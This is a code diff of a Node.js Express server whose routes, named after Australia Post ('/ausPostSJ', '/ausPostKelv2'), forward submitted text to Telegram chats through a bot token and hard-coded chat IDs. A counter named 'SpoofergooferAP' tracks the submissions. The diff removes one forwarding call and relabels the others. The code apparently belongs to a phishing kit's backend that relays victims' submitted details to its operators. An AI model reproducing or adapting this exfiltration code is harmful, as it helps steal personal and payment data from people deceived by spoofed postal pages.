@@ -269,9 +269,6 @@ app.post("/ausPostSJ", (req, res) => {
         axios.post(
           `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AusPostSJ:\n${originalText}`
         );
-        axios.post(
-          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=967388245&text=AusPost:\n${originalText}`
-        );
         SpoofergooferAP += 1;
       }
       res.send("Update Completed");
@@ -344,10 +341,10 @@ app.post("/ausPostKelv2", (req, res) => {
         SpoofergooferAP = 0;
       } else {
         axios.post(
-          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AusPostSJ:\n${originalText}`
+          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AusPostKelv:\n${originalText}`
         );
         axios.post(
-          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-757683438&text=AusPost:\n${originalText}`
+          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-757683438&text=AusPost 2:\n${originalText}`
         );
         SpoofergooferAP += 1;
       }
